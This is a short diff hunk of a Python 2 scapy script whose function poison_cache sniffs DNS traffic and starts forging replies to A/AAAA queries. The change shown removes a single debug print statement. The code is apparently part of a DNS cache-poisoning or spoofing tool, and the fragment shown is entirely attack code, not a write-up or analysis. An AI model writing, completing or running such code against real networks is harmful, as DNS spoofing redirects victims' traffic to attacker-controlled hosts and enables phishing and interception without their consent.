@@ -17,7 +17,6 @@ def poison_cache(pkt):
 			print "Response: " + str(ip_src) + " -> " + str(ip_dst) + " : " + "(" + pkt.getlayer(DNS).qd.qname + ":" + str(pkt.getlayer(DNSRR).show2()) + ")"
 		
 		if pkt.haslayer(DNSQR) and pkt.getlayer(DNS).qr == 0 and pkt[DNS].opcode == 0L and pkt[DNS].ancount == 0 and pkt[DNS].qd.qtype in {1, 28}:
-			print dir(pkt.getlayer(DNS))
 			print str(ip_src) + " -> " + str(ip_dst) + " : " + "(" + pkt.getlayer(DNS).qd.qname + ")"
 			pkt[UDP].chksum = None
 			query = pkt[DNS].qd
